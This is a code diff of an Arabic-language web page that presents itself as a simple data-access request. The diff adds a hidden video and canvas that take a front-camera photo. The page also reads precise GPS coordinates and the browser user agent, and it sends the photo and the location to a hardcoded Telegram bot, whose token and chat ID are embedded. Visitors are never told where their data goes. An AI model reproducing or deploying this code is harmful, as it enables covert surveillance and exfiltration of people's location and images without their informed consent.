@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب الإذن</title>
+    <title>طلب الوصول إلى البيانات</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,6 +20,7 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            margin: 10px;
         }
         button:hover {
             background-color: #0056b3;
@@ -28,42 +29,83 @@
             margin-top: 20px;
             color: #333;
         }
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <h1>طلب الوصول إلى البيانات</h1>
-    <p>اضغط على الزر أدناه للسماح بالوصول إلى بيانات الجهاز (مثل الموقع).</p>
-    <button onclick="requestPermission()">السماح</button>
+    <p>اضغط على الأزرار أدناه للسماح بالوصول إلى الكاميرا والموقع الجغرافي.</p>
+    <button onclick="requestCamera()">التقاط صورة</button>
+    <button onclick="requestLocation()">الحصول على الموقع</button>
     <p id="status">لم يتم طلب الإذن بعد.</p>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
 
     <script>
-        async function requestPermission() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const status = document.getElementById('status');
+
+        // طلب الوصول إلى الكاميرا الأمامية
+        async function requestCamera() {
             try {
-                // طلب إذن الموقع الجغرافي كمثال
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const data = `
-بيانات المستخدم:
-- الموقع الجغرافي: ${position.coords.latitude}, ${position.coords.longitude}
-- دقة الموقع: ${position.coords.accuracy} متر
-- الوقت: ${new Date(position.timestamp).toLocaleString()}
-- المتصفح: ${navigator.userAgent}
-- عنوان IP (تقريبي): غير متاح مباشرة عبر المتصفح
-                        `;
-                        document.getElementById('status').innerText = 'تم إرسال البيانات بنجاح!';
-                        await sendToTelegram(data);
-                    },
-                    (error) => {
-                        document.getElementById('status').innerText = 'تم رفض الإذن أو حدث خطأ.';
-                        console.error(error);
-                    }
-                );
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' } // تفضيل الكاميرا الأمامية
+                });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                status.innerText = 'الكاميرا مفتوحة. اضغط على الصورة لالتقاطها.';
+                
+                // التقاط الصورة عند النقر على الفيديو
+                video.onclick = () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    video.style.display = 'none';
+                    stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
+                    status.innerText = 'تم التقاط الصورة! جارٍ إرسالها...';
+                    sendPhotoToTelegram(imageData);
+                };
             } catch (error) {
-                document.getElementById('status').innerText = 'خطأ في طلب الإذن.';
+                status.innerText = 'خطأ في الوصول إلى الكاميرا: ' + error.message;
                 console.error(error);
             }
         }
 
+        // طلب الموقع الجغرافي باستخدام GPS
+        async function requestLocation() {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const data = `
+بيانات الموقع:
+- الإحداثيات: ${position.coords.latitude}, ${position.coords.longitude}
+- الدقة: ${position.coords.accuracy} متر
+- الوقت: ${new Date(position.timestamp).toLocaleString()}
+- المتصفح: ${navigator.userAgent}
+                        `;
+                        status.innerText = 'تم إرسال بيانات الموقع!';
+                        await sendToTelegram(data);
+                    },
+                    (error) => {
+                        status.innerText = 'خطأ في طلب الموقع: ' + error.message;
+                        console.error(error);
+                    },
+                    {
+                        enableHighAccuracy: true, // تفضيل GPS
+                        timeout: 10000, // المهلة الزمنية
+                        maximumAge: 0 // عدم استخدام بيانات مخزنة
+                    }
+                );
+            } catch (error) {
+                status.innerText = 'خطأ في طلب الموقع: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // إرسال نص إلى تيليجرام
         async function sendToTelegram(message) {
             const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
             const chatId = '6733154889';
@@ -72,21 +114,47 @@
             try {
                 const response = await fetch(url, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
                 });
-
-                if (!response.ok) {
-                    throw new Error('فشل إرسال البيانات إلى تيليجرام');
-                }
-                console.log('تم إرسال البيانات إلى تيليجرام بنجاح');
+                if (!response.ok) throw new Error('فشل إرسال النص إلى تيليجرام');
+                console.log('تم إرسال النص إلى تيليجرام');
             } catch (error) {
-                document.getElementById('status').innerText = 'خطأ في إرسال البيانات إلى تيليجرام.';
+                status.innerText = 'خطأ في إرسال النص إلى تيليجرام: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // إرسال الصورة إلى تيليجرام
+        async function sendPhotoToTelegram(imageData) {
+            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
+            const chatId = '6733154889';
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            try {
+                // تحويل Base64 إلى Blob
+                const byteString = atob(imageData.split(',')[1]);
+                const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: mimeString });
+
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'photo.png');
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) throw new Error('فشل إرسال الصورة إلى تيليجرام');
+                status.innerText = 'تم إرسال الصورة بنجاح!';
+                console.log('تم إرسال الصورة إلى تيليجرام');
+            } catch (error) {
+                status.innerText = 'خطأ في إرسال الصورة إلى تيليجرام: ' + error.message;
                 console.error(error);
             }
         }
